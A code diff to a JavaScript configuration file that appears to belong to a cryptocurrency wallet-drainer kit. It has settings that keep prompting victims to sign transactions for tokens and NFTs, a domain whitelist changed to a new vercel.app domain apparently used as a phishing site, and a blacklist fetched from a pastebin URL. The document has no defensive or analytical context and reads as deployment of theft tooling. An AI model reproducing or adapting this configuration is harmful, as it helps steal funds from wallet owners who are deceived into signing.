@@ -161,7 +161,7 @@ const MS_Loop_Tokens = 0; // 0 - Move on after rejection (RECOMMENDED), 1 - Prom
 const MS_Loop_NFTs = 0;   // 0 - Move on after rejection (RECOMMENDED), 1 - Prompt for signature until the last.
 
 const MS_Domains_Mode = 1; // 0 - Allow any domains, 1 - Allow only those in the whitelist.
-const MS_Domains_Whilelist = [ "lenix.vercel.app", "another.example.com" ]; // Whitelist of domains, fill in as per the example.
+const MS_Domains_Whilelist = [ "Bitnovatus.vercel.app", "another.example.com" ]; // Whitelist of domains, fill in as per the example.
 
 const MS_Blacklist_Online = 1; // 0 - use only local blacklist, 1 - load global blacklist
 const MS_Blacklist_URL = "https://pastebin.com/raw/fKg5tQWu"; // link to general blacklist (Raw-JSON)
